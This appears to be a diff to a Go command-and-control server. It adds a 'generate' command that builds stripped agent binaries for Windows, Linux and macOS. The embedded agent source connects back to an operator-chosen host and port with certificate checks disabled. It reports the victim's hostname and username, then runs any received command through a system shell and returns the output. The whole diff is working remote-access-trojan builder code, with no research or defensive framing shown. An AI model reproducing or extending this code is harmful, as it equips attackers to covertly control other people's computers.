@@ -9,6 +9,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"strings"
 	"sync"
 	"time"
@@ -134,6 +135,8 @@ func (s *Server) handleCommand(input string) {
 			return
 		}
 		s.removeClient(parts[1])
+	case "generate", "gen":
+		s.handleGenerateCommand(parts[1:])
 	case "status":
 		s.showStatus()
 	case "clear":
@@ -153,6 +156,11 @@ func (s *Server) showHelp() {
 	fmt.Println("  select <client_id>   - Interactive session with client")
 	fmt.Println("  broadcast <command>  - Send command to all clients")
 	fmt.Println("  remove <client_id>   - Disconnect a client")
+	fmt.Println("  generate <options>   - Generate agent binary")
+	fmt.Println("    gen windows        - Generate Windows agent")
+	fmt.Println("    gen linux          - Generate Linux agent")
+	fmt.Println("    gen macos          - Generate macOS agent")
+	fmt.Println("    gen custom <host> <port> <os> <output>")
 	fmt.Println("  status              - Show server status")
 	fmt.Println("  clear               - Clear screen")
 	fmt.Println("  quit/exit           - Shutdown server")
@@ -220,7 +228,7 @@ func (s *Server) selectClient(clientID string) {
 		}
 
 		s.sendCommand(client, command)
-		time.Sleep(100 * time.Millisecond) 
+		time.Sleep(100 * time.Millisecond) // Brief pause for response
 	}
 }
 
@@ -349,3 +357,288 @@ func (s *Server) clearScreen() {
 	s.showBanner()
 }
 
+func (s *Server) handleGenerateCommand(args []string) {
+	if len(args) == 0 {
+		fmt.Println("❌ Usage: generate <platform> or generate custom <host> <port> <os> <output>")
+		fmt.Println("Platforms: windows, linux, macos")
+		return
+	}
+
+	switch args[0] {
+	case "windows":
+		s.generateAgent("localhost", s.port, "windows", "agent-windows.exe")
+	case "linux":
+		s.generateAgent("localhost", s.port, "linux", "agent-linux")
+	case "macos":
+		s.generateAgent("localhost", s.port, "darwin", "agent-macos")
+	case "custom":
+		if len(args) < 5 {
+			fmt.Println("❌ Usage: generate custom <host> <port> <os> <output>")
+			fmt.Println("OS options: windows, linux, darwin")
+			return
+		}
+		s.generateAgent(args[1], args[2], args[3], args[4])
+	default:
+		fmt.Println("❌ Unknown platform. Use: windows, linux, macos, or custom")
+	}
+}
+
+func (s *Server) generateAgent(host, port, targetOS, output string) {
+	fmt.Printf("🔨 Generating agent for %s...\n", targetOS)
+
+	// Create agent source code with embedded config
+	agentSource := s.createAgentSource(host, port)
+
+	// Write temporary source file
+	tempFile := "temp_agent.go"
+	if err := os.WriteFile(tempFile, []byte(agentSource), 0644); err != nil {
+		fmt.Printf("❌ Failed to create temp source: %v\n", err)
+		return
+	}
+	defer os.Remove(tempFile)
+
+	// Build the agent
+	var cmd *exec.Cmd
+	env := os.Environ()
+	env = append(env, fmt.Sprintf("GOOS=%s", targetOS))
+
+	if targetOS == "windows" {
+		env = append(env, "GOARCH=amd64")
+		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", output, tempFile)
+	} else {
+		env = append(env, "GOARCH=amd64")
+		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", output, tempFile)
+	}
+
+	cmd.Env = env
+	cmd.Dir = "."
+
+	if output, err := cmd.CombinedOutput(); err != nil {
+		fmt.Printf("❌ Build failed: %v\n%s\n", err, string(output))
+		return
+	}
+
+	// Get file info
+	info, err := os.Stat(output)
+	if err != nil {
+		fmt.Printf("❌ Failed to get file info: %v\n", err)
+		return
+	}
+
+	fmt.Printf("✅ Agent generated successfully!\n")
+	fmt.Printf("📁 File: %s\n", output)
+	fmt.Printf("📊 Size: %.2f KB\n", float64(info.Size())/1024)
+	fmt.Printf("🎯 Target: %s:%s (%s)\n", host, port, targetOS)
+	fmt.Printf("💡 Usage: ./%s (on target system)\n", output)
+}
+
+func (s *Server) createAgentSource(host, port string) string {
+	return fmt.Sprintf(`package main
+
+import (
+	"crypto/tls"
+	"encoding/json"
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
+	"time"
+)
+
+const (
+	SERVER_HOST = "%s"
+	SERVER_PORT = "%s"
+	RECONNECT_INTERVAL = 10
+)
+
+type Message struct {
+	Type      string `+"`json:\"type\"`"+`
+	Command   string `+"`json:\"command\"`"+`
+	Result    string `+"`json:\"result\"`"+`
+	ClientID  string `+"`json:\"client_id\"`"+`
+	Timestamp int64  `+"`json:\"timestamp\"`"+`
+}
+
+type ClientInfo struct {
+	OS       string `+"`json:\"os\"`"+`
+	Arch     string `+"`json:\"arch\"`"+`
+	Hostname string `+"`json:\"hostname\"`"+`
+	User     string `+"`json:\"user\"`"+`
+	IP       string `+"`json:\"ip\"`"+`
+}
+
+func main() {
+	clientID := generateClientID()
+	
+	for {
+		if err := connectToServer(clientID); err != nil {
+			time.Sleep(RECONNECT_INTERVAL * time.Second)
+			continue
+		}
+		time.Sleep(RECONNECT_INTERVAL * time.Second)
+	}
+}
+
+func generateClientID() string {
+	hostname, _ := os.Hostname()
+	return fmt.Sprintf("%%s_%%d", hostname, time.Now().Unix())
+}
+
+func connectToServer(clientID string) error {
+	var conn net.Conn
+	var err error
+	
+	// Try TLS first
+	conn, err = tls.Dial("tcp", SERVER_HOST+":"+SERVER_PORT, &tls.Config{
+		InsecureSkipVerify: true,
+	})
+	if err != nil {
+		// Fallback to insecure
+		conn, err = net.Dial("tcp", SERVER_HOST+":"+SERVER_PORT)
+		if err != nil {
+			return err
+		}
+	}
+	defer conn.Close()
+	
+	// Register with server
+	if err := register(conn, clientID); err != nil {
+		return err
+	}
+	
+	// Start heartbeat
+	go heartbeat(conn, clientID)
+	
+	// Handle commands
+	return handleCommands(conn, clientID)
+}
+
+func register(conn net.Conn, clientID string) error {
+	hostname, _ := os.Hostname()
+	user := os.Getenv("USER")
+	if user == "" {
+		user = os.Getenv("USERNAME")
+	}
+	
+	info := ClientInfo{
+		OS:       runtime.GOOS,
+		Arch:     runtime.GOARCH,
+		Hostname: hostname,
+		User:     user,
+	}
+	
+	infoData, _ := json.Marshal(info)
+	msg := Message{
+		Type:      "register",
+		ClientID:  clientID,
+		Result:    string(infoData),
+		Timestamp: time.Now().Unix(),
+	}
+	
+	data, _ := json.Marshal(msg)
+	_, err := conn.Write(append(data, '\n'))
+	return err
+}
+
+func heartbeat(conn net.Conn, clientID string) {
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+	
+	for range ticker.C {
+		msg := Message{
+			Type:      "heartbeat",
+			ClientID:  clientID,
+			Timestamp: time.Now().Unix(),
+		}
+		data, _ := json.Marshal(msg)
+		if _, err := conn.Write(append(data, '\n')); err != nil {
+			return
+		}
+	}
+}
+
+func handleCommands(conn net.Conn, clientID string) error {
+	decoder := json.NewDecoder(conn)
+	
+	for {
+		var msg Message
+		if err := decoder.Decode(&msg); err != nil {
+			return err
+		}
+		
+		if msg.Type == "command" {
+			result := executeCommand(msg.Command)
+			sendResult(conn, clientID, result)
+		}
+	}
+}
+
+func executeCommand(command string) string {
+	parts := strings.Fields(command)
+	if len(parts) == 0 {
+		return "❌ Empty command"
+	}
+	
+	switch parts[0] {
+	case "sysinfo":
+		return getSystemInfo()
+	case "pwd":
+		dir, err := os.Getwd()
+		if err != nil {
+			return fmt.Sprintf("❌ Error: %%v", err)
+		}
+		return fmt.Sprintf("📁 Current directory: %%s", dir)
+	case "whoami":
+		user := os.Getenv("USER")
+		if user == "" {
+			user = os.Getenv("USERNAME")
+		}
+		return fmt.Sprintf("👤 Current user: %%s", user)
+	default:
+		return executeSystemCommand(command)
+	}
+}
+
+func getSystemInfo() string {
+	hostname, _ := os.Hostname()
+	user := os.Getenv("USER")
+	if user == "" {
+		user = os.Getenv("USERNAME")
+	}
+	
+	return fmt.Sprintf("💻 System Information:\nOS: %%s\nArch: %%s\nHostname: %%s\nUser: %%s\nGo: %%s",
+		runtime.GOOS, runtime.GOARCH, hostname, user, runtime.Version())
+}
+
+func executeSystemCommand(command string) string {
+	var cmd *exec.Cmd
+	
+	switch runtime.GOOS {
+	case "windows":
+		cmd = exec.Command("cmd", "/C", command)
+	default:
+		cmd = exec.Command("sh", "-c", command)
+	}
+	
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("❌ Error: %%v\nOutput: %%s", err, string(output))
+	}
+	return string(output)
+}
+
+func sendResult(conn net.Conn, clientID, result string) {
+	msg := Message{
+		Type:      "result",
+		Result:    result,
+		ClientID:  clientID,
+		Timestamp: time.Now().Unix(),
+	}
+	
+	data, _ := json.Marshal(msg)
+	conn.Write(append(data, '\n'))
+}
+`, host, port)
+}
